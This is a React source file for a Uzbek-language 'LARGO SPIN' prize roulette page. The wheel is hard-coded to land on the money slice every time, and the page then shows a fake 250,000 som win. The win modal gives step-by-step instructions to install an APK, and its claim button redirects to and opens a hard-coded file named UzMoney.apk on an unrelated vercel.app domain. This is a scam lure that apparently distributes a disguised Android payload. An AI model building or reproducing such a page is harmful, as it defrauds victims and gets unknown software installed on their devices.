import React, { useState, useRef, useEffect } from 'react';
import { useConfig } from '../hooks/useConfig';

export default function PremiumRoulette() {
  const { config, loading } = useConfig('roulette_premium');
  const [isSpinning, setIsSpinning] = useState(false);
  const [showWinModal, setShowWinModal] = useState(false);
  const [wheelRotation, setWheelRotation] = useState(0);
  const [coins, setCoins] = useState([]);
  const coinIdRef = useRef(0);
  const animationIdRef = useRef(null);

  // Используем данные из конфигурации или значения по умолчанию
  const prizes = config?.prizes || [];
  const texts = config?.texts || {};
  const settings = config?.settings || { spins: 10, spinDuration: 6000 };
  const apkUrl = config?.apkUrl || 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';

  const sliceAngle = prizes.length > 0 ? 360 / prizes.length : 0;

  const createCoin = () => {
    const newCoin = {
      id: coinIdRef.current++,
      left: Math.random() * 100,
      delay: Math.random() * 0.2,
      duration: 2 + Math.random() * 1.5,
      size: 25 + Math.random() * 25
    };
    setCoins(prev => [...prev, newCoin]);
    setTimeout(() => {
      setCoins(prev => prev.filter(c => c.id !== newCoin.id));
    }, (newCoin.delay + newCoin.duration) * 1000);
  };

  useEffect(() => {
    if (isSpinning) return;
    let last = performance.now();
    const idleRotate = (time) => {
      const delta = time - last;
      last = time;
      setWheelRotation(prev => prev + delta * 0.015);
      animationIdRef.current = requestAnimationFrame(idleRotate);
    };
    animationIdRef.current = requestAnimationFrame(idleRotate);
    return () => cancelAnimationFrame(animationIdRef.current);
  }, [isSpinning]);

  const handleSpin = () => {
    if (isSpinning) return;
    setIsSpinning(true);

    for (let i = 0; i < 60; i++) {
      setTimeout(() => createCoin(), i * 25);
    }

    const moneyIndex = 0;
    const moneyAngle = moneyIndex * sliceAngle + sliceAngle / 2;
    const targetAngle = 270 - moneyAngle;
    const spins = settings.spins || 10; 
    const finalRotation = wheelRotation + (360 * spins) + (targetAngle - (wheelRotation % 360));

    setWheelRotation(finalRotation);

    setTimeout(() => {
      setShowWinModal(true);
      setIsSpinning(false);
    }, settings.spinDuration || 6000);
  };

  const handleClaimPrize = () => {
    window.location.href = apkUrl;
    setTimeout(() => { window.open(apkUrl, '_blank'); }, 500);
  };

  // Показываем загрузку пока конфигурация не загружена
  if (loading) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff'
      }}>
        Загрузка...
      </div>
    );
  }

  // Если нет призов, показываем сообщение об ошибке
  if (!prizes || prizes.length === 0) {
    return (
      <div style={{
        minHeight: '100vh',
        background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        color: '#fff'
      }}>
        Ошибка загрузки конфигурации. Проверьте файл public/config/roulette_premium.json
      </div>
    );
  }

  return (
    <div style={{
      minHeight: '100vh',
      background: 'radial-gradient(circle at center, #1a0033 0%, #05000a 100%)',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      color: '#fff',
      fontFamily: "'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
      padding: '20px',
      overflow: 'hidden',
      position: 'relative'
    }}>
      <style>{`
        @keyframes shine { 0%, 100% { filter: brightness(1); } 50% { filter: brightness(1.3) drop-shadow(0 0 20px #ffd700); } }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes coinFall { 0% { transform: translateY(-100px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
        @keyframes pulse-gold { 0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(255,215,0,0.4); } 50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,215,0,0.7); } }
        .largo-gradient { background: linear-gradient(135deg, #fff 30%, #ffd700 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .glass-panel { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
      `}</style>

      {/* Падающие монеты */}
      {coins.map(coin => (
        <div key={coin.id} style={{
          position: 'fixed', left: `${coin.left}%`, top: '-50px', fontSize: `${coin.size}px`,
          animation: `coinFall ${coin.duration}s linear ${coin.delay}s forwards`, zIndex: 100
        }}>💰</div>
      ))}

      {/* Заголовок LARGO */}
      <div style={{ textAlign: 'center', zIndex: 10, marginBottom: '30px', animation: 'float 4s ease-in-out infinite' }}>
        <h1 className="largo-gradient" style={{ fontSize: '3.5rem', margin: 0, fontWeight: '900', letterSpacing: '-2px', textTransform: 'uppercase' }}>
          {texts.title || 'LARGO SPIN'}
        </h1>
        <div style={{ background: 'linear-gradient(90deg, #ffd700, #ff8c00)', color: '#000', padding: '4px 20px', borderRadius: '20px', fontWeight: '900', display: 'inline-block', fontSize: '0.8rem', boxShadow: '0 4px 15px rgba(255,215,0,0.3)' }}>
          {texts.badge || 'OFFICIAL LARGO APP 2025'}
        </div>
      </div>

      {/* Контейнер рулетки */}
      <div style={{ position: 'relative', width: 'min(85vw, 380px)', aspectRatio: '1', marginBottom: '40px', zIndex: 5 }}>
        {/* Внешнее золотое кольцо с лампочками */}
        <div style={{ position: 'absolute', inset: '-15px', border: '12px solid #ffd700', borderRadius: '50%', boxShadow: '0 0 40px rgba(0,0,0,0.5), inset 0 0 20px rgba(0,0,0,0.5)', zIndex: 2 }}>
           {/* Декоративные точки (лампочки) */}
           {[...Array(12)].map((_, i) => (
             <div key={i} style={{ position: 'absolute', width: '8px', height: '8px', background: '#fff', borderRadius: '50%', top: '50%', left: '50%', transform: `rotate(${i * 30}deg) translate(0, -188px)`, boxShadow: '0 0 10px #fff' }} />
           ))}
        </div>

        {/* СТРЕЛКА */}
        <div style={{
          position: 'absolute', top: '-25px', left: '50%', transform: 'translateX(-50%)',
          width: '45px', height: '55px', background: '#fff', clipPath: 'polygon(50% 100%, 0 0, 100% 0)',
          zIndex: 30, filter: 'drop-shadow(0 5px 10px rgba(0,0,0,0.5))'
        }} />

        {/* Колесо */}
        <div style={{
          width: '100%', height: '100%', borderRadius: '50%',
          transform: `rotate(${wheelRotation}deg)`,
          transition: isSpinning ? `transform ${(settings.spinDuration || 6000) / 1000}s cubic-bezier(0.1, 0, 0.1, 1)` : 'none',
          overflow: 'hidden', backgroundColor: '#111'
        }}>
          <svg viewBox="0 0 200 200" style={{ width: '100%', height: '100%' }}>
            {prizes.map((prize, index) => {
              const startAngle = index * sliceAngle;
              const endAngle = startAngle + sliceAngle;
              const x1 = 100 + 100 * Math.cos((startAngle * Math.PI) / 180);
              const y1 = 100 + 100 * Math.sin((startAngle * Math.PI) / 180);
              const x2 = 100 + 100 * Math.cos((endAngle * Math.PI) / 180);
              const y2 = 100 + 100 * Math.sin((endAngle * Math.PI) / 180);
              const midAngle = startAngle + sliceAngle / 2;
              const imgX = 100 + 65 * Math.cos((midAngle * Math.PI) / 180) - 15;
              const imgY = 100 + 65 * Math.sin((midAngle * Math.PI) / 180) - 15;

              return (
                <g key={index}>
                  <path d={`M 100 100 L ${x1} ${y1} A 100 100 0 0 1 ${x2} ${y2} Z`} fill={prize.color} stroke="#111" strokeWidth="0.5" />
                  <image href={prize.image} x={imgX} y={imgY} width="30" height="30" style={{ transformOrigin: `${imgX + 15}px ${imgY + 15}px`, transform: `rotate(${midAngle + 90}deg)` }} />
                </g>
              );
            })}
            <circle cx="100" cy="100" r="18" fill="#ffd700" stroke="#fff" strokeWidth="3" />
            <text x="100" y="104" fontSize="8" fontWeight="bold" textAnchor="middle" fill="#000">LARGO</text>
          </svg>
        </div>
      </div>

      {/* Кнопка запуска */}
      <button
        onClick={handleSpin}
        disabled={isSpinning}
        style={{
          padding: '20px 70px', fontSize: '1.4rem', fontWeight: '900', borderRadius: '50px',
          border: 'none', background: 'linear-gradient(to bottom, #ffd700, #ff8c00)',
          color: '#000', cursor: 'pointer', textTransform: 'uppercase',
          animation: isSpinning ? 'none' : 'pulse-gold 2s infinite',
          transition: 'all 0.2s ease', zIndex: 10, letterSpacing: '1px'
        }}
      >
        {isSpinning ? (texts.spinningButton || 'ОМАД КЕЛМОКДА...') : (texts.spinButton || 'ЮТИШНИ БОШЛАШ')}
      </button>

      <p style={{ marginTop: '25px', opacity: 0.6, fontSize: '0.85rem', textAlign: 'center', maxWidth: '300px' }}>
        {texts.footer || '* Largo иловаси фойдаланувчилари учун махсус акция'}
      </p>

      {/* МОДАЛЬНОЕ ОКНО LARGO */}
      {showWinModal && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.92)', 
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000, padding: '15px'
        }}>
          <div style={{
            background: '#fff', color: '#000', width: '100%', maxWidth: '400px',
            borderRadius: '35px', textAlign: 'center', padding: '40px 30px', position: 'relative',
            boxShadow: '0 0 60px rgba(255,215,0,0.5)', overflow: 'hidden'
          }}>
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '8px', background: 'linear-gradient(90deg, #ffd700, #ff8c00)' }} />
            
            <div style={{ fontSize: '1.1rem', fontWeight: '900', color: '#8A2BE2', letterSpacing: '2px', marginBottom: '15px' }}>
              {texts.modal?.brand || 'LARGO OFFICIAL'}
            </div>
            
            <div style={{ fontSize: '4.5rem', margin: '10px 0' }}>💰</div>
            
            <h2 style={{ fontSize: '2rem', fontWeight: '900', color: '#1a0033', margin: '0 0 10px 0', lineHeight: 1.1 }}>
              {texts.modal?.congratulations || 'ТАБРИКЛАЙМИЗ!'}
            </h2>
            
            <div style={{ background: '#f8f9fa', border: '2px dashed #ddd', padding: '20px', borderRadius: '25px', margin: '20px 0' }}>
              <span style={{ fontSize: '0.9rem', color: '#666', display: 'block', marginBottom: '5px' }}>
                {texts.modal?.winLabel || 'Сизнинг Largo ютугингиз:'}
              </span>
              <span style={{ fontSize: '2.5rem', fontWeight: '900', color: '#00c853' }}>
                {texts.modal?.winAmount || '250,000 СЎМ'}
              </span>
            </div>

            <div style={{ textAlign: 'left', marginBottom: '30px' }}>
              <p style={{ fontWeight: 'bold', marginBottom: '15px', fontSize: '1.05rem', color: '#333' }}>
                {texts.modal?.instructionsTitle || 'Пулни Largo оркали ечиш:'}
              </p>
              {(texts.modal?.steps || [
                { title: 'Largo иловасини юкланг', description: 'Пастдаги тугмани босиб APK-ни урнатинг' },
                { title: 'Руйхатдан утинг', description: 'Сизга ютуқ коди келади' },
                { title: 'Хисобингизни олинг', description: 'Пул 5 дақиқада картага тушади' }
              ]).map((step, i) => (
                <div key={i} style={{ display: 'flex', gap: '12px', marginBottom: '15px' }}>
                  <div style={{ background: '#1a0033', color: '#ffd700', width: '26px', height: '26px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 'bold', fontSize: '0.85rem', flexShrink: 0 }}>{i + 1}</div>
                  <div>
                    <div style={{ fontSize: '0.95rem', fontWeight: 'bold', color: '#1a0033' }}>{step.title || step.t}</div>
                    <div style={{ fontSize: '0.8rem', color: '#777' }}>{step.description || step.s}</div>
                  </div>
                </div>
              ))}
            </div>

            <button
              onClick={handleClaimPrize}
              style={{
                width: '100%', padding: '22px', background: 'linear-gradient(135deg, #00c853, #00ad48)', color: '#fff',
                border: 'none', borderRadius: '20px', fontSize: '1.25rem', fontWeight: '900',
                cursor: 'pointer', boxShadow: '0 12px 25px rgba(0,200,83,0.3)',
                transition: 'all 0.3s'
              }}
              onMouseEnter={(e) => e.target.style.transform = 'translateY(-2px)'}
              onMouseLeave={(e) => e.target.style.transform = 'translateY(0)'}
            >
              {texts.modal?.claimButton || 'ЮТУКНИ LARGO-ГА ОЛИШ 💸'}
            </button>
            
            <p style={{ fontSize: '0.7rem', color: '#999', marginTop: '15px' }}>
              {texts.modal?.id || 'ID: LARGO-WIN-2025-001'}
            </p>
          </div>
        </div>
      )}
    </div>
  );
}